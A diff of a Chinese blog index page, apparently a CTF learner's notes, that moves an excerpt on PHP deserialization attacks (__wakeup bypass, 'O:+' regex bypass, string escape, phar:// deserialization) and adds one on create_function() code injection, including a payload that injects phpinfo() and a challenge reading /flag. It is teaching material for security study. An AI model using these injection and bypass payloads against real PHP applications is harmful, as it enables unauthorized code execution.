@@ -235,106 +235,6 @@
     </footer>
 </div>
 
-<div class="cube-excerpt" id="cube-excerpt-PHP反序列化">
-    <header class="cube-excerpt-header">
-        <h1><a href="/myblog/2021/03/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a></h1>
-        <div class="cube-excerpt-header-msg">
-            <div class="cube-excerpt-date">
-                <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
-                2021-03-28
-            </div>
-            <div class="cube-excerpt-tags">
-                <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
-                
-                <a href="/myblog/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/" class="cube-excerpt-tag-link">#知识点</a>
-                
-            </div>
-        </div>
-    </header>
-    <article class="cube-excerpt-entry cube-markdown">
-        
-        
-           <h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><ul>
-<li>PHP反序列化漏洞也叫PHP对象注入，是一个非常常见的漏洞,基本都是围绕着serialize()，unserialize()这两个函数。在运行到这两个函数时会有相应的magic方法的调用。</li>
-</ul>
-<blockquote>
-<p>unserialize(): 恢复原先被序列化的变量<br>serialize(): 把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等 </p>
-</blockquote>
-<h3 id="序列化public-private-protect参数"><a href="#序列化public-private-protect参数" class="headerlink" title="序列化public private protect参数"></a>序列化public private protect参数</h3><p>Pubic 公有</p>
-<p>Private 私有</p>
-<p>Protect 保护</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class test&#123;</span><br><span class="line">    public $name &#x3D; &#39;xiaoming&#39;;  </span><br><span class="line">    private $sex &#x3D; &#39;man&#39;;  </span><br><span class="line">    protected $age &#x3D; &#39;20&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$test1 &#x3D; new test();</span><br><span class="line">$object &#x3D; serialize($test1);</span><br><span class="line">print_r($object);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>序列化之后打印出:<br><code>O:4:&quot;test&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;xiaoming&quot;;s:9:&quot;testsex&quot;;s:3:&quot;man&quot;;s:6:&quot;*age&quot;;s:2:&quot;20&quot;;&#125;</code></p>
-<h4 id="外"><a href="#外" class="headerlink" title="{}外"></a>{}外</h4><ul>
-<li>O代表object，还有一种情况是A，代表数组</li>
-<li>4代表对象名字占4个字符</li>
-<li>3代表对象里有三个变量</li>
-</ul>
-<h4 id="内"><a href="#内" class="headerlink" title="{}内"></a>{}内</h4><ul>
-<li>s的位置代表数据类型，s代表string，i代表int</li>
-<li>数据类型之后的数字代表变量的字符长度</li>
-</ul>
-<h4 id="Public属性序列化后格式-成员名"><a href="#Public属性序列化后格式-成员名" class="headerlink" title="Public属性序列化后格式: 成员名"></a>Public属性序列化后格式: <code>成员名</code></h4><h4 id="Private属性序列化后格式-00类名-00成员名"><a href="#Private属性序列化后格式-00类名-00成员名" class="headerlink" title="Private属性序列化后格式: %00类名%00成员名"></a>Private属性序列化后格式: <code>%00类名%00成员名</code></h4><h4 id="Protected属性序列化后的格式-00-00成员名"><a href="#Protected属性序列化后的格式-00-00成员名" class="headerlink" title="Protected属性序列化后的格式: %00*%00成员名"></a>Protected属性序列化后的格式: <code>%00*%00成员名</code></h4><blockquote>
-<p>一些magic方法</p>
-</blockquote>
-<ul>
-<li><p><code>__construct()</code> 当一个对象创建时被调用</p>
-</li>
-<li><p><code>__destruct()</code> 当一个对象销毁时被调用</p>
-</li>
-<li><p><code>__toString()</code> 当一个对象被当作一个字符串使用</p>
-</li>
-<li><p><code>__wakeup</code> 将在序列化之后立即被调用</p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.oop5.magic.php">魔术方法：官方文档中介绍</a></p>
-</li>
-<li><p>举一个别人的例子</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $varr1&#x3D;&quot;abc&quot;;</span><br><span class="line">    public $varr2&#x3D;&quot;123&quot;;</span><br><span class="line">    public function echoP()&#123;</span><br><span class="line">     echo $this-&gt;varr1.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">     echo &quot;__construct&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">     echo &quot;__destruct&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">     return &quot;__toString&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __sleep()&#123;</span><br><span class="line">     echo &quot;__sleep&lt;br&gt;&quot;;</span><br><span class="line">     return array(&#39;varr1&#39;,&#39;varr2&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">     echo &quot;__wakeup&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj &#x3D; new test();  &#x2F;&#x2F;实例化对象，调用__construct()方法，输出__construct</span><br><span class="line">$obj-&gt;echoP();   &#x2F;&#x2F;调用echoP()方法，输出&quot;abc&quot;</span><br><span class="line">echo $obj;    &#x2F;&#x2F;obj对象被当做字符串输出，调用__toString()方法，输出__toString</span><br><span class="line">$s &#x3D;serialize($obj);  &#x2F;&#x2F;obj对象被序列化，调用__sleep()方法，输出__sleep</span><br><span class="line">echo unserialize($s);  &#x2F;&#x2F;$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。</span><br><span class="line">&#x2F;&#x2F; 脚本结束又会调用__destruct()方法，输出__destruct</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
-<li><p>打印出:<br><code>__construct abc __toString __sleep __wakeup __toString __destruct __destruct</code></p>
-</li>
-<li><p>通过这个例子就可以清晰的看到魔法函数在符合相应的条件时便会被调用</p>
-</li>
-</ul>
-<h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h3><ul>
-<li>若存在__wakeup方法，调用 unserilize() 方法前则先调用__wakeup方法，但是如果序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</li>
-<li>例如：<code>O:4:&quot;test&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;xiaoming&quot;;s:9:&quot;testsex&quot;;s:3:&quot;man&quot;;s:6:&quot;*age&quot;;s:2:&quot;20&quot;;&#125;</code>更改{}外的3就可实现绕过</li>
-</ul>
-<h3 id="OC-绕过"><a href="#OC-绕过" class="headerlink" title="OC 绕过"></a>OC 绕过</h3><p>正则匹配的规则是: 在不区分大小写的情况下，若字符串出现<code>&quot;o:数字&quot;</code>或者<code>&quot;c:数字&quot;</code>这样的格式就会被过滤，而<code>serialize()</code>的参数为<code>object</code>的时候，参数类型肯定为对象 <code>O</code>，序列化字符串的格式为<code>参数格式:参数名长度</code>,因此<code>O:数字</code>这样的字符串肯定无法通过正则匹配。这时我们可以在数字前加上一个<code>+</code>，即<code>O:+数字</code>，就可以绕过正则的过滤。</p>
-<h3 id="私有属性绕过"><a href="#私有属性绕过" class="headerlink" title="私有属性绕过"></a>私有属性绕过</h3><p>前面有说过Private属性序列化后格式，所以可以通过构造<code>%00类名%00成员名</code>，来提取private的内容。protected则通过构造<code>%00*%00成员名</code>来提取。</p>
-<h3 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class test&#123; public $name &#x3D; &#39;xiaoming&#39;; public $sex &#x3D; &#39;man&#39;; public $age &#x3D; &#39;20&#39;; &#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>O:4:&quot;test&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;xiaoming&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;&#125;</code><br>尝试将<code>sex</code>传入成<code>sex&quot;;s:3:&quot;woman&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;&#125;</code>,这样将会打印<code>O:4:&quot;test&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;xiaoming&quot;;s:3:&quot;sex&quot;;s:3:&quot;woman&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;&#125;sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;&#125;</code><br>在一些情况下，就可以尝试注入一些代码来获取自己想要的信息</p>
-<h3 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h3><ul>
-<li>phar介绍<br>简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行。之前，安全研究员Sam Thomas分享了议题It’s a PHP unserialization vulnerability Jim, but not as we know it，利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。</li>
-</ul>
-<blockquote>
-<p>phar结构由 4 部分组成</p>
-</blockquote>
-<ul>
-<li><p>stub phar 文件标识，格式为 <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>；</p>
-</li>
-<li><p>manifest 压缩文件的属性等信息，以序列化存储；</p>
-</li>
-<li><p>contents 压缩文件的内容；</p>
-</li>
-<li><p>signature 签名，放在文件末尾，格式如下：<br><a target="_blank" rel="noopener" href="http://tc-test.nos-eastchina1.126.net/2020-10/08/21-25-01-606.jpg"><img src="http://tc-test.nos-eastchina1.126.net/2020-10/08/21-25-01-606.jpg" alt="image"></a></p>
-</li>
-<li><p>phar存储的meta-data信息以序列化方式存储，,当<a target="_blank" rel="noopener" href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>通过phar://伪协议解析phar文件时就会将数据反序列化</p>
-</li>
-<li><p>将phar伪造成其他格式的文件<br>php识别phar文件是通过其文件头的stub，即<code>__HALT_COMPILER();?&gt;</code>，对前面的内容或者后缀名没什么特殊要求。所以，我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
-</li>
-<li><p>漏洞利用方面<br><a target="_blank" rel="noopener" href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">网址</a></p>
-</li>
-</ul>
-
-        
-    </article>
-    <footer class="cube-excerpt-footer">
-        <a class="cube-excerpt-more" href="/myblog/2021/03/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">阅读全文</a>
-    </footer>
-</div>
-
 <div class="cube-excerpt" id="cube-excerpt-ctf-Crypto常见加解密">
     <header class="cube-excerpt-header">
         <h1><a href="/myblog/2021/03/28/ctf-Crypto%E5%B8%B8%E8%A7%81%E5%8A%A0%E8%A7%A3%E5%AF%86/">ctf-Crypto常见加解密</a></h1>
@@ -432,6 +332,106 @@
     </article>
     <footer class="cube-excerpt-footer">
         <a class="cube-excerpt-more" href="/myblog/2021/03/28/ctf-Crypto%E5%B8%B8%E8%A7%81%E5%8A%A0%E8%A7%A3%E5%AF%86/">阅读全文</a>
+    </footer>
+</div>
+
+<div class="cube-excerpt" id="cube-excerpt-PHP反序列化">
+    <header class="cube-excerpt-header">
+        <h1><a href="/myblog/2021/03/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a></h1>
+        <div class="cube-excerpt-header-msg">
+            <div class="cube-excerpt-date">
+                <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
+                2021-03-28
+            </div>
+            <div class="cube-excerpt-tags">
+                <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
+                
+                <a href="/myblog/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/" class="cube-excerpt-tag-link">#知识点</a>
+                
+            </div>
+        </div>
+    </header>
+    <article class="cube-excerpt-entry cube-markdown">
+        
+        
+           <h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><ul>
+<li>PHP反序列化漏洞也叫PHP对象注入，是一个非常常见的漏洞,基本都是围绕着serialize()，unserialize()这两个函数。在运行到这两个函数时会有相应的magic方法的调用。</li>
+</ul>
+<blockquote>
+<p>unserialize(): 恢复原先被序列化的变量<br>serialize(): 把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等 </p>
+</blockquote>
+<h3 id="序列化public-private-protect参数"><a href="#序列化public-private-protect参数" class="headerlink" title="序列化public private protect参数"></a>序列化public private protect参数</h3><p>Pubic 公有</p>
+<p>Private 私有</p>
+<p>Protect 保护</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class test&#123;</span><br><span class="line">    public $name &#x3D; &#39;xiaoming&#39;;  </span><br><span class="line">    private $sex &#x3D; &#39;man&#39;;  </span><br><span class="line">    protected $age &#x3D; &#39;20&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$test1 &#x3D; new test();</span><br><span class="line">$object &#x3D; serialize($test1);</span><br><span class="line">print_r($object);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>序列化之后打印出:<br><code>O:4:&quot;test&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;xiaoming&quot;;s:9:&quot;testsex&quot;;s:3:&quot;man&quot;;s:6:&quot;*age&quot;;s:2:&quot;20&quot;;&#125;</code></p>
+<h4 id="外"><a href="#外" class="headerlink" title="{}外"></a>{}外</h4><ul>
+<li>O代表object，还有一种情况是A，代表数组</li>
+<li>4代表对象名字占4个字符</li>
+<li>3代表对象里有三个变量</li>
+</ul>
+<h4 id="内"><a href="#内" class="headerlink" title="{}内"></a>{}内</h4><ul>
+<li>s的位置代表数据类型，s代表string，i代表int</li>
+<li>数据类型之后的数字代表变量的字符长度</li>
+</ul>
+<h4 id="Public属性序列化后格式-成员名"><a href="#Public属性序列化后格式-成员名" class="headerlink" title="Public属性序列化后格式: 成员名"></a>Public属性序列化后格式: <code>成员名</code></h4><h4 id="Private属性序列化后格式-00类名-00成员名"><a href="#Private属性序列化后格式-00类名-00成员名" class="headerlink" title="Private属性序列化后格式: %00类名%00成员名"></a>Private属性序列化后格式: <code>%00类名%00成员名</code></h4><h4 id="Protected属性序列化后的格式-00-00成员名"><a href="#Protected属性序列化后的格式-00-00成员名" class="headerlink" title="Protected属性序列化后的格式: %00*%00成员名"></a>Protected属性序列化后的格式: <code>%00*%00成员名</code></h4><blockquote>
+<p>一些magic方法</p>
+</blockquote>
+<ul>
+<li><p><code>__construct()</code> 当一个对象创建时被调用</p>
+</li>
+<li><p><code>__destruct()</code> 当一个对象销毁时被调用</p>
+</li>
+<li><p><code>__toString()</code> 当一个对象被当作一个字符串使用</p>
+</li>
+<li><p><code>__wakeup</code> 将在序列化之后立即被调用</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.oop5.magic.php">魔术方法：官方文档中介绍</a></p>
+</li>
+<li><p>举一个别人的例子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $varr1&#x3D;&quot;abc&quot;;</span><br><span class="line">    public $varr2&#x3D;&quot;123&quot;;</span><br><span class="line">    public function echoP()&#123;</span><br><span class="line">     echo $this-&gt;varr1.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">     echo &quot;__construct&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">     echo &quot;__destruct&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">     return &quot;__toString&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __sleep()&#123;</span><br><span class="line">     echo &quot;__sleep&lt;br&gt;&quot;;</span><br><span class="line">     return array(&#39;varr1&#39;,&#39;varr2&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">     echo &quot;__wakeup&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj &#x3D; new test();  &#x2F;&#x2F;实例化对象，调用__construct()方法，输出__construct</span><br><span class="line">$obj-&gt;echoP();   &#x2F;&#x2F;调用echoP()方法，输出&quot;abc&quot;</span><br><span class="line">echo $obj;    &#x2F;&#x2F;obj对象被当做字符串输出，调用__toString()方法，输出__toString</span><br><span class="line">$s &#x3D;serialize($obj);  &#x2F;&#x2F;obj对象被序列化，调用__sleep()方法，输出__sleep</span><br><span class="line">echo unserialize($s);  &#x2F;&#x2F;$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。</span><br><span class="line">&#x2F;&#x2F; 脚本结束又会调用__destruct()方法，输出__destruct</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p>打印出:<br><code>__construct abc __toString __sleep __wakeup __toString __destruct __destruct</code></p>
+</li>
+<li><p>通过这个例子就可以清晰的看到魔法函数在符合相应的条件时便会被调用</p>
+</li>
+</ul>
+<h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h3><ul>
+<li>若存在__wakeup方法，调用 unserilize() 方法前则先调用__wakeup方法，但是如果序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</li>
+<li>例如：<code>O:4:&quot;test&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;xiaoming&quot;;s:9:&quot;testsex&quot;;s:3:&quot;man&quot;;s:6:&quot;*age&quot;;s:2:&quot;20&quot;;&#125;</code>更改{}外的3就可实现绕过</li>
+</ul>
+<h3 id="OC-绕过"><a href="#OC-绕过" class="headerlink" title="OC 绕过"></a>OC 绕过</h3><p>正则匹配的规则是: 在不区分大小写的情况下，若字符串出现<code>&quot;o:数字&quot;</code>或者<code>&quot;c:数字&quot;</code>这样的格式就会被过滤，而<code>serialize()</code>的参数为<code>object</code>的时候，参数类型肯定为对象 <code>O</code>，序列化字符串的格式为<code>参数格式:参数名长度</code>,因此<code>O:数字</code>这样的字符串肯定无法通过正则匹配。这时我们可以在数字前加上一个<code>+</code>，即<code>O:+数字</code>，就可以绕过正则的过滤。</p>
+<h3 id="私有属性绕过"><a href="#私有属性绕过" class="headerlink" title="私有属性绕过"></a>私有属性绕过</h3><p>前面有说过Private属性序列化后格式，所以可以通过构造<code>%00类名%00成员名</code>，来提取private的内容。protected则通过构造<code>%00*%00成员名</code>来提取。</p>
+<h3 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class test&#123; public $name &#x3D; &#39;xiaoming&#39;; public $sex &#x3D; &#39;man&#39;; public $age &#x3D; &#39;20&#39;; &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>O:4:&quot;test&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;xiaoming&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;&#125;</code><br>尝试将<code>sex</code>传入成<code>sex&quot;;s:3:&quot;woman&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;&#125;</code>,这样将会打印<code>O:4:&quot;test&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;xiaoming&quot;;s:3:&quot;sex&quot;;s:3:&quot;woman&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;&#125;sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;&#125;</code><br>在一些情况下，就可以尝试注入一些代码来获取自己想要的信息</p>
+<h3 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h3><ul>
+<li>phar介绍<br>简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行。之前，安全研究员Sam Thomas分享了议题It’s a PHP unserialization vulnerability Jim, but not as we know it，利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。</li>
+</ul>
+<blockquote>
+<p>phar结构由 4 部分组成</p>
+</blockquote>
+<ul>
+<li><p>stub phar 文件标识，格式为 <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>；</p>
+</li>
+<li><p>manifest 压缩文件的属性等信息，以序列化存储；</p>
+</li>
+<li><p>contents 压缩文件的内容；</p>
+</li>
+<li><p>signature 签名，放在文件末尾，格式如下：<br><a target="_blank" rel="noopener" href="http://tc-test.nos-eastchina1.126.net/2020-10/08/21-25-01-606.jpg"><img src="http://tc-test.nos-eastchina1.126.net/2020-10/08/21-25-01-606.jpg" alt="image"></a></p>
+</li>
+<li><p>phar存储的meta-data信息以序列化方式存储，,当<a target="_blank" rel="noopener" href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>通过phar://伪协议解析phar文件时就会将数据反序列化</p>
+</li>
+<li><p>将phar伪造成其他格式的文件<br>php识别phar文件是通过其文件头的stub，即<code>__HALT_COMPILER();?&gt;</code>，对前面的内容或者后缀名没什么特殊要求。所以，我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
+</li>
+<li><p>漏洞利用方面<br><a target="_blank" rel="noopener" href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">网址</a></p>
+</li>
+</ul>
+
+        
+    </article>
+    <footer class="cube-excerpt-footer">
+        <a class="cube-excerpt-more" href="/myblog/2021/03/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">阅读全文</a>
     </footer>
 </div>
 
@@ -752,6 +752,72 @@
     </footer>
 </div>
 
+<div class="cube-excerpt" id="cube-excerpt-题目里扩展的知识点create_function()注入">
+    <header class="cube-excerpt-header">
+        <h1><a href="/myblog/2021/03/28/%E9%A2%98%E7%9B%AE%E9%87%8C%E6%89%A9%E5%B1%95%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9create_function()%E6%B3%A8%E5%85%A5/">题目里扩展的知识点create_function()注入</a></h1>
+        <div class="cube-excerpt-header-msg">
+            <div class="cube-excerpt-date">
+                <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
+                2021-03-28
+            </div>
+            <div class="cube-excerpt-tags">
+                <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
+                
+                <a href="/myblog/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/" class="cube-excerpt-tag-link">#知识点</a>
+                
+            </div>
+        </div>
+    </header>
+    <article class="cube-excerpt-entry cube-markdown">
+        
+        
+           <h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$a &#x3D; create_function(&quot;&quot;, &quot;echo(&#96;cat &#x2F;flag&#96;);&quot;);</span><br><span class="line">if(isset($_GET[&#39;a&#39;]))&#123;</span><br><span class="line">     $_GET[&#39;a&#39;]();</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>只要我们知道了create_function这个匿名函数的名字并赋值给a，就能得到flag。</p>
+<p><code>create_function()</code>根据传递的参数创建匿名函数，并返回该函数的唯一名称。（函数名称<code>lambda_&#39;数字&#39;</code>）</p>
+<p>而且每刷新一次<code>lambda_&#39;数字&#39;</code>的数字就会+1</p>
+<p>举一个例子</p>
+<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_16-03-01.png"><img src="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_16-03-01.png" alt="Snipaste_2020-12-23_16-03-01"></a></p>
+<p>这里echo出来的还有一个不可见字符，我们可以用%00代替，<code>%00lambda_1</code></p>
+<p>这边我直接用<code>%00lambda_1</code>就出了flag</p>
+<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_14-27-47.png"><img src="https://qlr-0.gitee.io/hhhh/tu/Snipaste_2020-12-23_14-27-47.png" alt="Snipaste_2020-12-23_14-27-47"></a></p>
+<p>其实一般是要进行爆破，可以用burp suite进行抓包，然后爆破。</p>
+<ul>
+<li><p>上面例子中<code>create_function(&quot;&quot;,&quot;echo(&#39;haha&#39;);&quot;);</code>其实等价于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function ambda_1()&#123;</span><br><span class="line">    echo(&quot;haha&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="create-function-实现代码注入"><a href="#create-function-实现代码注入" class="headerlink" title="create_function() 实现代码注入"></a>create_function() 实现代码注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; &#39;echo &#39;.$t.&#39;dasdasd&#39;.$a.&quot;;&quot;;</span><br><span class="line">echo $b;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">$c &#x3D; create_function(&quot;$t&quot;,$b);</span><br><span class="line">?&gt;</span><br><span class="line">   # payload:  ?a&#x3D;2;&#125;phpinfo();&#x2F;*    </span><br></pre></td></tr></table></figure>
+
+<p>还原实际的组合过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b &#x3D; &#39;echo &#39;.$t.&#39;dasdasd&#39;.2;&#125;phpinfo();&#x2F;* .&quot;;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>匿名函数实际的执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function %00lambda_‘数字’($t)&#123;</span><br><span class="line">echo .$t.&#39;dasdasd&#39;.2;</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();&#x2F;* .&quot;;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
